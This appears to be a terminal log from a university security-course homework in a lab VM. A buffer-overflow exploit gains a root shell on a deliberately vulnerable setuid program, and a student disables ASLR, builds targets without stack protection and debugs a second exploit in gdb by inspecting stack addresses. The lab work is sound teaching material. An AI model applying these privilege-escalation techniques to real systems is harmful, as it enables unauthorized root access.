shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0 ; echo whoami | ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Nov 27 20:21:43 2019 from 10.0.2.2
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploit
-bash: cd: ../sploit: No such file or directory
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -al
total 60
drwxr-xr-x 2 student student  4096 Nov 28 13:17 .
drwxr-xr-x 6 student student  4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student   475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 10316 Nov 27 20:22 sploit0
-rw-r--r-- 1 student student  1089 Nov 27 20:20 sploit0.c
-rwxrwxr-x 1 student student 10240 Nov 28 13:17 sploit1
-rw-r--r-- 1 student student   683 Nov 28 13:16 sploit1.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit2.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit3.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff570:
 eip = 0xb7eb97e0 in execve (../sysdeps/unix/syscall-template.S:84); saved eip = 0x80485cd
 called by frame at 0xbffff5c0
 source language asm.
 Arglist at 0xbffff568, args: 
 Locals at 0xbffff568, Previous frame's sp is 0xbffff570
 Saved registers:
  eip at 0xbffff56c
(gdb) n
process 1980 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbfffff04) at target1.c:16
16	  if( argc != 2 )
(gdb) break 8
Breakpoint 3 at 0x80484a1: file target1.c, line 8.
(gdb) info frame
Stack level 0, frame at 0xbffffe70:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe68, args: argc=2, argv=0xbfffff04
 Locals at 0xbffffe68, Previous frame's sp is 0xbffffe70
 Saved registers:
  ebp at 0xbffffe68, eip at 0xbffffe6c
(gdb) x/64x 0xbffffe68-64
0xbffffe28:	0xb7fb9244	0xb7e210ec	0x00000002	0x00000000
0xbffffe38:	0xb7e37a50	0x0804854b	0x00000002	0xbfffff04
0xbffffe48:	0xbfffff10	0x08048521	0xb7fbb3dc	0x08048210
0xbffffe58:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe68:	0x00000000	0xb7e21637	0x00000002	0xbfffff04
0xbffffe78:	0xbfffff10	0x00000000	0x00000000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe98:	0xb7fbb000	0xb7fbb000	0x00000000	0x872413da
0xbffffea8:	0xbcf31dca	0x00000000	0x00000000	0x00000000
0xbffffeb8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffec8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffed8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffee8:	0xbfffff04	0x08048500	0x08048560	0xb7fea880
0xbffffef8:	0xbffffefc	0xb7fff918	0x00000002	0xbfffffe1
0xbfffff08:	0xbfffffee	0x00000000	0x00000000	0x00000020
0xbfffff18:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
(gdb) x/64 0xbfffff04 - 32
0xbffffee4:	0x00000002	0xbfffff04	0x08048500	0x08048560
0xbffffef4:	0xb7fea880	0xbffffefc	0xb7fff918	0x00000002
0xbfffff04:	0xbfffffe1	0xbfffffee	0x00000000	0x00000000
0xbfffff14:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
0xbfffff24:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xbfffff34:	0x00000011	0x00000064	0x00000003	0x08048034
0xbfffff44:	0x00000004	0x00000020	0x00000005	0x00000009
0xbfffff54:	0x00000007	0xb7fdb000	0x00000008	0x00000000
0xbfffff64:	0x00000009	0x080483a0	0x0000000b	0x000003e8
0xbfffff74:	0x0000000c	0x000003e8	0x0000000d	0x000003e8
0xbfffff84:	0x0000000e	0x000003e8	0x00000017	0x00000001
0xbfffff94:	0x00000019	0xbfffffcb	0x0000001a	0x00000000
0xbfffffa4:	0x0000001f	0xbfffffef	0x0000000f	0xbfffffdb
0xbfffffb4:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffffc4:	0x00000000	0x69000000	0x792ba9fa	0xbb52bc6c
0xbfffffd4:	0xa8619a6f	0x699d0f28	0x00363836	0x6d742f00
(gdb) x/x $x/64 0xbfffff04 + 32
A syntax error in expression, near `0xbfffff04 + 32'.
(gdb) x/x64 0xbfffff04 + 32
A syntax error in expression, near `0xbfffff04 + 32'.
(gdb) x/64x 0xbfffff04 + 32
0xbfffff24:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xbfffff34:	0x00000011	0x00000064	0x00000003	0x08048034
0xbfffff44:	0x00000004	0x00000020	0x00000005	0x00000009
0xbfffff54:	0x00000007	0xb7fdb000	0x00000008	0x00000000
0xbfffff64:	0x00000009	0x080483a0	0x0000000b	0x000003e8
0xbfffff74:	0x0000000c	0x000003e8	0x0000000d	0x000003e8
0xbfffff84:	0x0000000e	0x000003e8	0x00000017	0x00000001
0xbfffff94:	0x00000019	0xbfffffcb	0x0000001a	0x00000000
0xbfffffa4:	0x0000001f	0xbfffffef	0x0000000f	0xbfffffdb
0xbfffffb4:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffffc4:	0x00000000	0x69000000	0x792ba9fa	0xbb52bc6c
0xbfffffd4:	0xa8619a6f	0x699d0f28	0x00363836	0x6d742f00
0xbfffffe4:	0x61742f70	0x74656772	0x2f000031	0x2f706d74
0xbffffff4:	0x67726174	0x00317465	0x00000000	Cannot access memory at address 0xc0000000
(gdb) 
0xc0000004:	Cannot access memory at address 0xc0000004
(gdb) n
22	  foo( argv[1] );
(gdb) info frame
Stack level 0, frame at 0xbffffe70:
 eip = 0x80484dc in main (target1.c:22); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe68, args: argc=2, argv=0xbfffff04
 Locals at 0xbffffe68, Previous frame's sp is 0xbffffe70
 Saved registers:
  ebp at 0xbffffe68, eip at 0xbffffe6c
(gdb) x/x64 0xbffffe70+120
A syntax error in expression, near `0xbffffe70+120'.
(gdb) x/x64 0xbffffe70+32
A syntax error in expression, near `0xbffffe70+32'.
(gdb) x/x64 0xbffffe70 + 32
A syntax error in expression, near `0xbffffe70 + 32'.
(gdb) x/x64 0xbffffe68-22
A syntax error in expression, near `0xbffffe68-22'.
(gdb) x/x64 0xbffffe68-24
A syntax error in expression, near `0xbffffe68-24'.
(gdb) x/64x 0xbffffe70+32
0xbffffe90:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffea0:	0x00000000	0x872413da	0xbcf31dca	0x00000000
0xbffffeb0:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffec0:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffed0:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffffee0:	0x080484b5	0x00000002	0xbfffff04	0x08048500
0xbffffef0:	0x08048560	0xb7fea880	0xbffffefc	0xb7fff918
0xbfffff00:	0x00000002	0xbfffffe1	0xbfffffee	0x00000000
0xbfffff10:	0x00000000	0x00000020	0xb7fd9cec	0x00000021
0xbfffff20:	0xb7fd9000	0x00000010	0x178bfbff	0x00000006
0xbfffff30:	0x00001000	0x00000011	0x00000064	0x00000003
0xbfffff40:	0x08048034	0x00000004	0x00000020	0x00000005
0xbfffff50:	0x00000009	0x00000007	0xb7fdb000	0x00000008
0xbfffff60:	0x00000000	0x00000009	0x080483a0	0x0000000b
0xbfffff70:	0x000003e8	0x0000000c	0x000003e8	0x0000000d
0xbfffff80:	0x000003e8	0x0000000e	0x000003e8	0x00000017
(gdb) x/64x 0xbffffe70-32
0xbffffe50:	0xb7fbb3dc	0x08048210	0x08048509	0x00000000
0xbffffe60:	0xb7fbb000	0xb7fbb000	0x00000000	0xb7e21637
0xbffffe70:	0x00000002	0xbfffff04	0xbfffff10	0x00000000
0xbffffe80:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe90:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffea0:	0x00000000	0x872413da	0xbcf31dca	0x00000000
0xbffffeb0:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffec0:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffed0:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffffee0:	0x080484b5	0x00000002	0xbfffff04	0x08048500
0xbffffef0:	0x08048560	0xb7fea880	0xbffffefc	0xb7fff918
0xbfffff00:	0x00000002	0xbfffffe1	0xbfffffee	0x00000000
0xbfffff10:	0x00000000	0x00000020	0xb7fd9cec	0x00000021
0xbfffff20:	0xb7fd9000	0x00000010	0x178bfbff	0x00000006
0xbfffff30:	0x00001000	0x00000011	0x00000064	0x00000003
0xbfffff40:	0x08048034	0x00000004	0x00000020	0x00000005
(gdb) info frame
Stack level 0, frame at 0xbffffe70:
 eip = 0x80484dc in main (target1.c:22); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe68, args: argc=2, argv=0xbfffff04
 Locals at 0xbffffe68, Previous frame's sp is 0xbffffe70
 Saved registers:
  ebp at 0xbffffe68, eip at 0xbffffe6c
(gdb) n

Breakpoint 3, foo (temp=0xbfffffee "") at target1.c:10
10	  strncpy(name, temp, 12);
(gdb) info frame
Stack level 0, frame at 0xbffffe64:
 eip = 0x80484a1 in foo (target1.c:10); saved eip = 0x80484ea
 called by frame at 0xbffffe70
 source language c.
 Arglist at 0xbffffe5c, args: temp=0xbfffffee ""
 Locals at 0xbffffe5c, Previous frame's sp is 0xbffffe64
 Saved registers:
  ebp at 0xbffffe5c, eip at 0xbffffe60
(gdb) x/64x 0xbffffe60-32
0xbffffe40:	0x00000002	0xbfffff04	0xbfffff10	0x08048521
0xbffffe50:	0xb7fbb3dc	0x08048210	0x08048509	0xbffffe68
0xbffffe60:	0x080484ea	0xbfffffee	0x00000000	0xb7e21637
0xbffffe70:	0x00000002	0xbfffff04	0xbfffff10	0x00000000
0xbffffe80:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe90:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffea0:	0x00000000	0x872413da	0xbcf31dca	0x00000000
0xbffffeb0:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffec0:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffed0:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffffee0:	0x080484b5	0x00000002	0xbfffff04	0x08048500
0xbffffef0:	0x08048560	0xb7fea880	0xbffffefc	0xb7fff918
0xbfffff00:	0x00000002	0xbfffffe1	0xbfffffee	0x00000000
0xbfffff10:	0x00000000	0x00000020	0xb7fd9cec	0x00000021
0xbfffff20:	0xb7fd9000	0x00000010	0x178bfbff	0x00000006
0xbfffff30:	0x00001000	0x00000011	0x00000064	0x00000003
(gdb) n
11	}
(gdb) info frame
Stack level 0, frame at 0xbffffe64:
 eip = 0x80484b2 in foo (target1.c:11); saved eip = 0x0
 called by frame at 0x0
 source language c.
 Arglist at 0xbffffe5c, args: temp=0xbfffffee ""
 Locals at 0xbffffe5c, Previous frame's sp is 0xbffffe64
 Saved registers:
  ebp at 0xbffffe5c, eip at 0xbffffe60
(gdb) n
0x00000000 in ?? ()
(gdb) info frame
Stack level 0, frame at 0x0:
 eip = 0x0; saved eip = <unavailable>
 Outermost frame: outermost
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp in esp
(gdb) n
Cannot find bounds of current function
(gdb) n
Cannot find bounds of current function
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/target1 

Breakpoint 1, main (argc=1, argv=0xbffff694) at target1.c:16
16	  if( argc != 2 )
(gdb) info frame
Stack level 0, frame at 0xbffff600:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5f8, args: argc=1, argv=0xbffff694
 Locals at 0xbffff5f8, Previous frame's sp is 0xbffff600
 Saved registers:
  ebp at 0xbffff5f8, eip at 0xbffff5fc
(gdb) x/64x 0xbffff5f8-32
0xbffff5d8:	0xbffff69c	0x08048521	0xb7fbb3dc	0x08048210
0xbffff5e8:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffff5f8:	0x00000000	0xb7e21637	0x00000001	0xbffff694
0xbffff608:	0xbffff69c	0x00000000	0x00000000	0x00000000
0xbffff618:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffff628:	0xb7fbb000	0xb7fbb000	0x00000000	0xae536041
0xbffff638:	0x95948e51	0x00000000	0x00000000	0x00000000
0xbffff648:	0x00000001	0x080483a0	0x00000000	0xb7ff0010
0xbffff658:	0xb7fea880	0xb7fff000	0x00000001	0x080483a0
0xbffff668:	0x00000000	0x080483c1	0x080484b5	0x00000001
0xbffff678:	0xbffff694	0x08048500	0x08048560	0xb7fea880
0xbffff688:	0xbffff68c	0xb7fff918	0x00000001	0xbffff7c6
0xbffff698:	0x00000000	0xbffff7d3	0xbffff7e4	0xbffff7f4
0xbffff6a8:	0xbffff808	0xbffff825	0xbffff838	0xbffff845
0xbffff6b8:	0xbffffdcd	0xbffffdd9	0xbffffe6c	0xbffffe83
0xbffff6c8:	0xbffffe92	0xbffffeb3	0xbffffedd	0xbffffeee
(gdb) n
18	    fprintf(stderr, "meet: argc != 2\n");
(gdb) n
meet: argc != 2
19	    exit(EXIT_FAILURE);
(gdb) n
[Inferior 1 (process 1988) exited with code 01]
(gdb) run
Starting program: /tmp/target1 

Breakpoint 1, main (argc=1, argv=0xbffff694) at target1.c:16
16	  if( argc != 2 )
(gdb) break 10
Note: breakpoint 3 also set at pc 0x80484a1.
Breakpoint 4 at 0x80484a1: file target1.c, line 10.
(gdb) m
Ambiguous command "m": macro, maintenance, make, mem, monitor, mt.
(gdb) n
18	    fprintf(stderr, "meet: argc != 2\n");
(gdb) info frame
Stack level 0, frame at 0xbffff600:
 eip = 0x80484be in main (target1.c:18); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5f8, args: argc=1, argv=0xbffff694
 Locals at 0xbffff5f8, Previous frame's sp is 0xbffff600
 Saved registers:
  ebp at 0xbffff5f8, eip at 0xbffff5fc
(gdb) n
meet: argc != 2
19	    exit(EXIT_FAILURE);
(gdb) n
[Inferior 1 (process 1989) exited with code 01]
(gdb) n
The program is not being run.
(gdb) n
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdp -q sploit1
No command 'gdp' found, but there are 16 similar ones
gdp: command not found
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) v
Undefined command: "v".  Try "help".
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff570:
 eip = 0xb7eb97e0 in execve (../sysdeps/unix/syscall-template.S:84); saved eip = 0x80485cd
 called by frame at 0xbffff5c0
 source language asm.
 Arglist at 0xbffff568, args: 
 Locals at 0xbffff568, Previous frame's sp is 0xbffff570
 Saved registers:
  eip at 0xbffff56c
(gdb) n
process 1997 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbfffff04) at target1.c:16
16	  if( argc != 2 )
(gdb) info frame
Stack level 0, frame at 0xbffffe70:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe68, args: argc=2, argv=0xbfffff04
 Locals at 0xbffffe68, Previous frame's sp is 0xbffffe70
 Saved registers:
  ebp at 0xbffffe68, eip at 0xbffffe6c
(gdb) x/64x 0xbfffff04-32
0xbffffee4:	0x00000002	0xbfffff04	0x08048500	0x08048560
0xbffffef4:	0xb7fea880	0xbffffefc	0xb7fff918	0x00000002
0xbfffff04:	0xbfffffe1	0xbfffffee	0x00000000	0x00000000
0xbfffff14:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
0xbfffff24:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xbfffff34:	0x00000011	0x00000064	0x00000003	0x08048034
0xbfffff44:	0x00000004	0x00000020	0x00000005	0x00000009
0xbfffff54:	0x00000007	0xb7fdb000	0x00000008	0x00000000
0xbfffff64:	0x00000009	0x080483a0	0x0000000b	0x000003e8
0xbfffff74:	0x0000000c	0x000003e8	0x0000000d	0x000003e8
0xbfffff84:	0x0000000e	0x000003e8	0x00000017	0x00000001
0xbfffff94:	0x00000019	0xbfffffcb	0x0000001a	0x00000000
0xbfffffa4:	0x0000001f	0xbfffffef	0x0000000f	0xbfffffdb
0xbfffffb4:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffffc4:	0x00000000	0x2c000000	0xa196d191	0xf9fe7047
0xbfffffd4:	0x4ff04143	0x69bd7d1a	0x00363836	0x6d742f00
(gdb) x/x $esp
0xbffffe68:	0x00000000
(gdb) x/64 0xbffffe68-32
0xbffffe48:	0xbfffff10	0x08048521	0xb7fbb3dc	0x08048210
0xbffffe58:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe68:	0x00000000	0xb7e21637	0x00000002	0xbfffff04
0xbffffe78:	0xbfffff10	0x00000000	0x00000000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe98:	0xb7fbb000	0xb7fbb000	0x00000000	0x1f73a283
0xbffffea8:	0x24a4ac93	0x00000000	0x00000000	0x00000000
0xbffffeb8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffec8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffed8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffee8:	0xbfffff04	0x08048500	0x08048560	0xb7fea880
0xbffffef8:	0xbffffefc	0xb7fff918	0x00000002	0xbfffffe1
0xbfffff08:	0xbfffffee	0x00000000	0x00000000	0x00000020
0xbfffff18:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff28:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff38:	0x00000064	0x00000003	0x08048034	0x00000004
(gdb) x/64 0xbffffe68+32
0xbffffe88:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe98:	0xb7fbb000	0xb7fbb000	0x00000000	0x1f73a283
0xbffffea8:	0x24a4ac93	0x00000000	0x00000000	0x00000000
0xbffffeb8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffec8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffed8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffee8:	0xbfffff04	0x08048500	0x08048560	0xb7fea880
0xbffffef8:	0xbffffefc	0xb7fff918	0x00000002	0xbfffffe1
0xbfffff08:	0xbfffffee	0x00000000	0x00000000	0x00000020
0xbfffff18:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff28:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff38:	0x00000064	0x00000003	0x08048034	0x00000004
0xbfffff48:	0x00000020	0x00000005	0x00000009	0x00000007
0xbfffff58:	0xb7fdb000	0x00000008	0x00000000	0x00000009
0xbfffff68:	0x080483a0	0x0000000b	0x000003e8	0x0000000c
0xbfffff78:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
(gdb) x/64x 0xbffffe68-32
0xbffffe48:	0xbfffff10	0x08048521	0xb7fbb3dc	0x08048210
0xbffffe58:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe68:	0x00000000	0xb7e21637	0x00000002	0xbfffff04
0xbffffe78:	0xbfffff10	0x00000000	0x00000000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe98:	0xb7fbb000	0xb7fbb000	0x00000000	0x1f73a283
0xbffffea8:	0x24a4ac93	0x00000000	0x00000000	0x00000000
0xbffffeb8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffec8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffed8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffee8:	0xbfffff04	0x08048500	0x08048560	0xb7fea880
0xbffffef8:	0xbffffefc	0xb7fff918	0x00000002	0xbfffffe1
0xbfffff08:	0xbfffffee	0x00000000	0x00000000	0x00000020
0xbfffff18:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff28:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff38:	0x00000064	0x00000003	0x08048034	0x00000004
(gdb) x/64x 0xbffffe68+32
0xbffffe88:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe98:	0xb7fbb000	0xb7fbb000	0x00000000	0x1f73a283
0xbffffea8:	0x24a4ac93	0x00000000	0x00000000	0x00000000
0xbffffeb8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffec8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffed8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffee8:	0xbfffff04	0x08048500	0x08048560	0xb7fea880
0xbffffef8:	0xbffffefc	0xb7fff918	0x00000002	0xbfffffe1
0xbfffff08:	0xbfffffee	0x00000000	0x00000000	0x00000020
0xbfffff18:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff28:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff38:	0x00000064	0x00000003	0x08048034	0x00000004
0xbfffff48:	0x00000020	0x00000005	0x00000009	0x00000007
0xbfffff58:	0xb7fdb000	0x00000008	0x00000000	0x00000009
0xbfffff68:	0x080483a0	0x0000000b	0x000003e8	0x0000000c
0xbfffff78:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
(gdb) x/4x 0xbfffff04-4
0xbfffff00:	0x00000002	0xbfffffe1	0xbfffffee	0x00000000
(gdb) x/4x 0xbfffff04-8
0xbffffefc:	0xb7fff918	0x00000002	0xbfffffe1	0xbfffffee
(gdb) x/8x 0xbfffff04-8
0xbffffefc:	0xb7fff918	0x00000002	0xbfffffe1	0xbfffffee
0xbfffff0c:	0x00000000	0x00000000	0x00000020	0xb7fd9cec
(gdb) x/8x 0xbfffff04+8
0xbfffff0c:	0x00000000	0x00000000	0x00000020	0xb7fd9cec
0xbfffff1c:	0x00000021	0xb7fd9000	0x00000010	0x178bfbff
(gdb) x/8x 0xbfffff04-8
0xbffffefc:	0xb7fff918	0x00000002	0xbfffffe1	0xbfffffee
0xbfffff0c:	0x00000000	0x00000000	0x00000020	0xb7fd9cec
(gdb) x/42x 0xbfffff04-8
0xbffffefc:	0xb7fff918	0x00000002	0xbfffffe1	0xbfffffee
0xbfffff0c:	0x00000000	0x00000000	0x00000020	0xb7fd9cec
0xbfffff1c:	0x00000021	0xb7fd9000	0x00000010	0x178bfbff
0xbfffff2c:	0x00000006	0x00001000	0x00000011	0x00000064
0xbfffff3c:	0x00000003	0x08048034	0x00000004	0x00000020
0xbfffff4c:	0x00000005	0x00000009	0x00000007	0xb7fdb000
0xbfffff5c:	0x00000008	0x00000000	0x00000009	0x080483a0
0xbfffff6c:	0x0000000b	0x000003e8	0x0000000c	0x000003e8
0xbfffff7c:	0x0000000d	0x000003e8	0x0000000e	0x000003e8
0xbfffff8c:	0x00000017	0x00000001	0x00000019	0xbfffffcb
0xbfffff9c:	0x0000001a	0x00000000
(gdb) x/42x 0xbfffff04+8
0xbfffff0c:	0x00000000	0x00000000	0x00000020	0xb7fd9cec
0xbfffff1c:	0x00000021	0xb7fd9000	0x00000010	0x178bfbff
0xbfffff2c:	0x00000006	0x00001000	0x00000011	0x00000064
0xbfffff3c:	0x00000003	0x08048034	0x00000004	0x00000020
0xbfffff4c:	0x00000005	0x00000009	0x00000007	0xb7fdb000
0xbfffff5c:	0x00000008	0x00000000	0x00000009	0x080483a0
0xbfffff6c:	0x0000000b	0x000003e8	0x0000000c	0x000003e8
0xbfffff7c:	0x0000000d	0x000003e8	0x0000000e	0x000003e8
0xbfffff8c:	0x00000017	0x00000001	0x00000019	0xbfffffcb
0xbfffff9c:	0x0000001a	0x00000000	0x0000001f	0xbfffffef
0xbfffffac:	0x0000000f	0xbfffffdb
(gdb) x 0xbfffff04
0xbfffff04:	0xbfffffe1
(gdb) x/8 0xbfffff04
0xbfffff04:	0xbfffffe1	0xbfffffee	0x00000000	0x00000000
0xbfffff14:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
(gdb) x/64 0xbfffff04
0xbfffff04:	0xbfffffe1	0xbfffffee	0x00000000	0x00000000
0xbfffff14:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
0xbfffff24:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xbfffff34:	0x00000011	0x00000064	0x00000003	0x08048034
0xbfffff44:	0x00000004	0x00000020	0x00000005	0x00000009
0xbfffff54:	0x00000007	0xb7fdb000	0x00000008	0x00000000
0xbfffff64:	0x00000009	0x080483a0	0x0000000b	0x000003e8
0xbfffff74:	0x0000000c	0x000003e8	0x0000000d	0x000003e8
0xbfffff84:	0x0000000e	0x000003e8	0x00000017	0x00000001
0xbfffff94:	0x00000019	0xbfffffcb	0x0000001a	0x00000000
0xbfffffa4:	0x0000001f	0xbfffffef	0x0000000f	0xbfffffdb
0xbfffffb4:	0x00000000	0x00000000	0x00000000	0x00000000
